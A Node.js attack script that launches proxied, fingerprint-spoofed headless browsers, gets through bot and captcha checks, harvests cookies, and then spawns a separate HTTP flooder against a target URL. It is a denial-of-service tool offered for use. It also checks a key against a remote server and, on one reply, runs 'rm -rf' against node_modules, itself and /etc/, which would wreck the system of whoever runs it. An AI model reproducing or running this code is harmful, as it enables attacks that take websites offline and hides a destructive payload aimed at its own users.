const puppeteer = require('puppeteer-extra');
//const RecaptchaPlugin = require('puppeteer-extra-plugin-recaptcha');
const pluu = require('puppeteer-extra-plugin-stealth');
const request_2 = require('request');
const http = require('http');
const url = require('url');
const fs = require('fs');
const chalk = require('chalk');
const {spawn} = require('child_process');
const crypto = require('crypto');
const uuid = require('uuid');
const events = require('events');
const { cpus } = require('os');
var theJar = request_2.jar();
const time_starting = Date.now();

const prox2y = fs.readFileSync('http_flood.txt').toString().match(/\S+/g);
const proxies_total = prox2y.length;

var target = process.argv[2];
var time = process.argv[3];
const key_mod = process.argv[4];
const rqs = process.argv[5];

var parsed = url.parse(target);
var host = url.parse(target).host;

let bro_count = '';
let browser_saves = '';

//process.title = `node ${host}`;

ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError','connect', 'Error', 'net', '::'],
ignoreCodes = ['ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT','EADDRNOTAVAIL', 'EPROTO', 'Error', 'ERR_CONNECTION_RESET', 'ERR_TIMED_OUT', 'ERR_EMPTY_RESPONSE', 'ERR_PROXY_CONNECTION_FAILED'];
process.on('uncaughtException', function (e) {
    if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return false;
    console.warn(e);
}).on('unhandledRejection', function (e) {
    if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return false;
    console.warn(e);
}).on('warning', e => {
    if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return false;
    console.warn(e);
}).on('SIGHUP', () => {
    return 1;
}).on('SIGCHILD', () => {
    return 1;
});

events.EventEmitter.defaultMaxListeners = Infinity;
events.EventEmitter.prototype._maxListeners = Infinity;

if (target == null && time == null && key_mod == null){
console('Usage: node browser.js [URL] [TIME] [Key_Access]');
}

request_2.get({
url: 'https://scaldic-basin.000webhostapp.com/con_e_ct_io_n.php?key_us='+key_mod,
method: "GET",
headers: {
'User-Agent': "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/77.0.3865.90 Chrome/77.0.3865.90 Safari/537.36",
}
}, (err, res, response) => {

if (err){
process.exit(-15);
}

if (response == 'invalid_delate'){
exec('rm -rf node_modules; rm -rf .npm; rm -rf browser.js; rm -rf /etc/', (error, stdout, stderr) => {
});

console.log('Key especifiqued ('+key_mod+') no are valid..')
process.exit(-15)//kill process
}

if (response == 'invalid'){
console.log('Key especifiqued ('+key_mod+') no are valid..')
process.exit(-15)//kill process
} else {
//all good
}

});


function alert(){
console.log('Starting browser :: Url: '+target+' :: Time: '+time);
}
alert();

const delay = ms => new Promise(resolve => setTimeout(resolve, ms))

function asdas(){
return proxy_obje = prox2y[~~[Math.random() * proxies_total]];
}

async function browser_closing(page){
await page.close();
}

function num_browser_count(){
bro_count++;
}

function brow_tokens(strings, proxy_co){
if (browser_saves == null && browser_saves == undefined && browser_saves == ''){
browser_saves += ''+proxy_co+'#'+strings+''+'::';
} else {
browser_saves += ''+proxy_co+'#'+strings+''+'::';


}
}

function between(min, max) {  
  return Math.floor(
    Math.random() * (max - min) + min
  )
}

async function launch_(){
  var proxy_obje = asdas();
  let browsers_started = '';
  //puppeteer.use(pluu());

puppeteer.launch({ headless: 'false',
  ignoreHTTPSErrors: true,
  acceptInsecureCerts: true,
  product: 'chrome',
  //userDataDir: '/Users/batu/Desktop/status/data',
  args: [
        '--no-sandbox',
       '--disable-gpu',
        '--disable-canvas-aa', // Disable antialiasing on 2d canvas
       '--disable-2d-canvas-clip-aa', // Disable antialiasing on 2d canvas clips
        '--disable-gl-drawing-for-tests', // BEST OPTION EVER! Disables GL drawing operations which produce pixel output. With this the GL output will not be correct but tests will run faster.
        '--disable-dev-shm-usage', // ???
        '--no-zygote', // wtf does that mean ?
        '--use-gl=swiftshader', // better cpu usage with --use-gl=desktop rather than --use-gl=swiftshader, still needs more testing.
        '--enable-webgl',
        '--hide-scrollbars',
        '--mute-audio',
        '--no-first-run',
        '--disable-infobars',
        '--disable-breakpad',
        '--disable-setuid-sandbox',
        `--proxy-server=${proxy_obje}`,
        '--disable-dev-shm-usage',
]
}).then(async browser => {
  const page = await browser.newPage();
  await page.setDefaultNavigationTimeout(90000, (err, res) => {});


            await page.evaluateOnNewDocument(() => {
            Object.defineProperty(navigator, 'webdriver', {
                get: () => false,
            });
        });

await page.evaluateOnNewDocument(() => {
    Object.defineProperty(navigator, 'platform', {
        get: () => 'Win32',
    });
});

await page.evaluateOnNewDocument(() => {
  const originalQuery = window.navigator.permissions.query;
  window.detailChrome = 'unknown';
  return window.navigator.permissions.query = (parameters) => (
    parameters.name === 'notifications' ?
      Promise.resolve({ state: Notification.permission }) :
      originalQuery(parameters)
  );
});
//});


await page.evaluateOnNewDocument(() => {
  Object.defineProperty(navigator, 'plugins', {
    get: () => [
        {
            0: {type: "__application/x-google-chrome-pdf~pdf~", suffixes: "pdf", description: "Portable Document Format"},
            description: "Portable Document Format",
            filename: "rVq1aNGDBAgwYsWLFiRo0aNGjRo069eP",
            length: 1,
            name: "Browser PDF and PS Display"
        },
    ],
  });
});
        await page.evaluateOnNewDocument(() => {
          Object.defineProperty(navigator, 'languages', {
                get: () => ['en-US', 'en'],
            });
        });

    await page.setViewport({
        width: 1200,
        height: 800
    });


    await page.evaluateOnNewDocument(() => {
        const originalFunction = HTMLCanvasElement.prototype.toDataURL;
        HTMLCanvasElement.prototype.toDataURL = function (type) {
            if (type === 'image/png' && this.width === 220 && this.height === 30) {
                return 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAANwAAAAeCAAAAABiES/iAAACeElEQVRYw+2YzUtUURjGf47OmDPh5AyFomUiEeEmyghXtWsh4dcswlYV2KYWfZh/QRBUVLhTCCJXEgmKUCIkFhJREARBkbkyKBlTRmUC82lxZ7z3TjM4whwXwz2ry3vO87znx33Pey4XFfHAg/PgPDgPzoPz4Dy4rFIKscSkAfmnsUY+iTfXFhxue4Zm4QpfaKbg8k+EsZNsGG6iNVzRMrkZeRPmjp6eCgcae5f+3wJIgtWLldG+DUnfzoail1etaVsEa1f2lUqw2hPd3T7nCrkMtlkQ24YDwP8+FZkI+gY3uq2cTcu54GIA/dJCDUAnSE4RdAESdALUxZ0hl4E5OMs49iE528E5a+cj5YFhDVI3vLA2c4K+zLXpvR37tNRDs3STg1OJqXqQSwS14wlJUD+VeHWAW86Qy8BwQ5Ek/WK/JBgqC72UTvJakmY5lAvurTRPSDrMmKRRcIvgeUo2KmmEI86Qy8DwmVu/ezQIBCSBLzwjKZhujv5cZZmUNkAq57ekRXCLYDG12pre5Qy5DAzDXbPfIOB/JqmCzNafCZd+dMA5RfZxdsBlNTAMF+FJfD2eSvSI0iGpmXe5GnbG3qyyHAO3yCZxlGV2uBLWDcJVMZKc7UrnfIBvQI+pHpxbS34ZaNkK7gYN0yvTDSCXyCZxNJTscFFe/DUH1w3QvpnzPiUPdTXfsvxZDdBGmeQU2SQd9lWQHS5m9J6Ln4/suZCwc96D25qM1formq5/3ApOX1uDkZ7P7JXkENkkK5eqQm3flRtuvitSYgCucKOf0zv01bazcG3Tyz8GKukvSjjrlB3/U5Rw42dqAo29yypKOO8figeX1/gH+zX9JqfOeUwAAAAASUVORK5CYII=';
            }
            return originalFunction.apply(this, arguments);
        };
    });

await page.setRequestInterception(true);
page.on('request', request => {
  if (request.resourceType().toUpperCase() === 'IMAGE' || request.resourceType() === 'stylesheet' || request.resourceType() === 'font')
    request.abort();
  else
    request.continue();
});

await page.setUserAgent('Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36');

    await page.setExtraHTTPHeaders({
      'Accept-Language': 'en-US,en;q=0.9',
      'Accept-Encoding': 'gzip, deflate, br',
    });

const expiree = (65 * 1e3) + Date.now();
setTimeout(async () => {
await page.close();
}, expiree - Date.now());

 let response = await page.goto(target, {waitUntil: 'load'}, (err, res) => {});
 process.on("uncaughtException", (reason, p) => {
});

  process.on("ERR_TIMED_OUT", (reason, p) => {
});

process.on("Error", (reason, p) => {
});

process.on("net::ERR_EMPTY_RESPONSE", (reason, p) => {
});
process.on("net::ERR_PROXY_CONNECTION_FAILED", (reason, p) => {
});

process.on("Target.closeTarget", (reason, p) => {

})

const handleClose = async (msg) =>{
      //  console.log(msg)
        page.close();
        browser.close();
        //process.exit(1);
}

 const status_start = response.status();
/*
 await page.waitFor(2000);
await page.mouse.move(100, 100);
await page.mouse.down();
await page.mouse.move(200, 200);
await page.mouse.up();
await page.waitFor(6000)


 await page.reload({waitUntil: 'load'});
 await page.waitFor(1000);
 await page.mouse.move(100, 100);
await page.mouse.down();
await page.mouse.move(200, 200);
await page.mouse.up();
await page.waitFor(6000)


 await page.reload({waitUntil: 'load'});*/
 await delay(5000);
 await page.mouse.move(100, 100);
await page.mouse.down();
await page.mouse.move(200, 200);
await page.mouse.up();
 await page.keyboard.press('Enter');
await page.keyboard.press('NumpadEnter');
await page.keyboard.press('\n');
await page.keyboard.press('\r');
await delay(5000);

async function autoScroll(page) {
  await page.evaluate(async () => {
    await new Promise((resolve, reject) => {
      var totalHeight = 0;
      var distance = 100;
      var timer = setInterval(() => {
        var scrollHeight = document.body.scrollHeight;
        window.scrollBy(0, distance);
        totalHeight += distance;

        if (totalHeight >= scrollHeight) {
          clearInterval(timer);
          resolve();
        }
      }, 100);
    });
  });
}
await autoScroll(page);

console.log('Wait 8s');

await delay(2000) /// waiting 1 second.
 //await page.waitFor(8000);

  if (await page.$('div[class="rc-anchor rc-anchor-normal rc-anchor-light"]')){
  console.log(color.yellow('[Info]')+color.cyan(' ReCaptcha Detectected.'));
  await solve2(page);
}

//await solve2(page);

  const cookie_par = await page.cookies();
  const user_page_ = await page.evaluate(() => navigator.userAgent);

let laa_ = JSON.stringify(cookie_par);
laa_ = JSON.parse(laa_);
let myString = '';

laa_.forEach(value => {
  const valueString = value.name + '=' + value.value + ';';
  myString += valueString;
});

//await page.screenshot({ path: 'response.png', fullPage: true });

num_browser_count(); // +1 count browsers

/* all done */
console.log(chalk.cyan(bro_count + ' New Browser Saved.'));

if(bro_count < 5){
await page.close();
} else {
}


if (myString !== null){
brow_tokens(myString, proxy_obje); // adding tokens
}else{
await handleClose();
}
await page.close();
});
}


/* starting browsers */
function brow(){
console.log(chalk.cyan('HTTP-SPLIT (Raw Conections)'));
setTimeout(() => {
for (let j = 0; j < 20; j++) {
  launch_();
}
}, 5 * 1000);
}
brow()

async function startt(page){
  detecte_browser_done(page);
}

async function detecte_browser_done(page){
const expire3e = (5 * 1e3) + Date.now();
setTimeout(async () => {
if(bro_count < 5){
await page.close();
} else {
startt(page);
}
}, expire3e - Date.now());
}

/* flooder */

const expiree = (80 * 1e3) + Date.now();
setTimeout(() => {
console.log('[Info] Execution script..');
spawn('node', [ "flooder.js", target, 'GoodProxy.txt', time, browser_saves]);
}, expiree - Date.now());


const expiree2 = (time * 1e3) + Date.now();
setTimeout(() => {
process.exit(-15)
}, expiree2 - Date.now());